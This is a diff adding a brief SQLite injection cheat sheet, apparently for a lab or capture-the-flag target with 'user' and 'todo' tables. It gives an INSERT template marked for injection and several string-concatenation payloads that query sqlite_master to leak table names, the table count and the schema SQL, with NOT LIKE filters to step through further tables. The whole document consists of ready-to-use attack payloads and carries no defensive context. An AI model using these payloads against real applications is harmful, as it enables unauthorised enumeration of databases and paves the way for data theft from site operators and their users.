@@ -1,0 +1,10 @@
+=============SQLite===================
+INSERT INTO <something> (val1, val2,...) VALUES (val1, 'inject here', val3,...);
+
+table: user, todo, None
+
+' || (SELECT tbl_name FROM sqlite_master ) || '    -- Leak table name
+' || (SELECT count(tbl_name) FROM sqlite_master ) || '		-- Leak number of table
+' || (SELECT sql FROM sqlite_master) || '					-- Leak Table query
+' || (SELECT sql FROM sqlite_master WHERE tbl_name NOT LIKE "thing") || '
+' || (SELECT tbl_name FROM sqlite_master WHERE tbl_name NOT LIKE "thing" AND tbl_name NOT LIKE "another thing") || '
